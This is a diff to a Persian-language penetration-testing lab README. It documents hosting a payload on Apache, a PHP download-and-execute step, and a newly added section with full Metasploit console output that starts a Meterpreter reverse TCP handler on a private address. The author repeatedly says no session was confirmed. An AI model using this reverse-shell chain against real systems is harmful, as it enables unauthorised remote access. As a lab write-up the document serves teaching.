@@ -147,9 +147,6 @@ systemctl start apache2.service
 
 در پایان این مرحله، payload ساخته شده و در مسیر قابل ارائه توسط وب‌سرور قرار گرفته بود و Apache نیز برای ارائه فایل از طریق HTTP راه‌اندازی شده بود. این دستورات **ثابت نمی‌کنند** که ماشین هدف فایل را دانلود یا اجرا کرده است یا یک نشست برگشتی Meterpreter برقرار شده است. برای ثبت چنین نتیجه‌ای به شواهد جداگانه نیاز است و فقط در صورت تأیید، آن را در گزارش اضافه می‌کنم.
 
----
-
-*برای نگارش این README از کمک هوش مصنوعی استفاده شده است.*
 
 
 ## ۱۱. آماده‌سازی دستور دانلود و اجرای Payload در PHP
@@ -166,6 +163,39 @@ systemctl start apache2.service
 
 ![تصویر ۱۱: آماده‌سازی دستور PHP در فایل code.php](screenshots/11.png)
 
-![تصویر ۱۲: شواهد تکمیلی از مرحله آماده‌سازی PHP](screenshots/12.png)
 
 این تصویر، دستور واردشده در فایل PHP را مستند می‌کند؛ اما به‌تنهایی ثابت نمی‌کند که کد PHP اجرا شده، payload با موفقیت دانلود یا اجرا شده، یا نشست برگشتی Meterpreter برقرار شده است. نتیجه این موارد را پس از بررسی و تأیید جداگانه ثبت می‌کنم.
+
+
+## ۱۲. راه‌اندازی Handler متِرپرتر
+
+با توجه به تنظیم payload برای اتصال به آدرس `192.168.43.220:444`، ماژول `multi/handler` را در Metasploit اجرا کردم و همان payload از نوع Linux x86 Meterpreter Reverse TCP را برای آن تنظیم کردم:
+
+```text
+=[ metasploit v6.4.84-dev                                ]
++ -- --=[ 2,547 exploits - 1,309 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[*] Starting persistent handler(s)...
+msf > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
+payload => linux/x86/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set lhost 192.168.43.220
+lhost => 192.168.43.220
+msf exploit(multi/handler) > set lport 444
+lport => 444
+msf exploit(multi/handler) > exploit
+[*] Started reverse TCP handler on 192.168.43.220:444
+```
+
+این خروجی تأیید می‌کند که Handler با آدرس `192.168.43.220` و پورت `444` راه‌اندازی شده و در انتظار اتصال بوده است. بااین‌حال، هنوز هیچ اتصال ورودی یا نشست Meterpreter در این خروجی دیده نمی‌شود؛ برای تأیید آن‌ها به شواهد جداگانه نیاز است.
+
+![تصویر ۱۲: فعال شدن multi-handler متِرپرتر روی پورت ۴۴۴](screenshots/12.png)
+
+---
+
+*برای نگارش این README از کمک هوش مصنوعی استفاده شده است.*
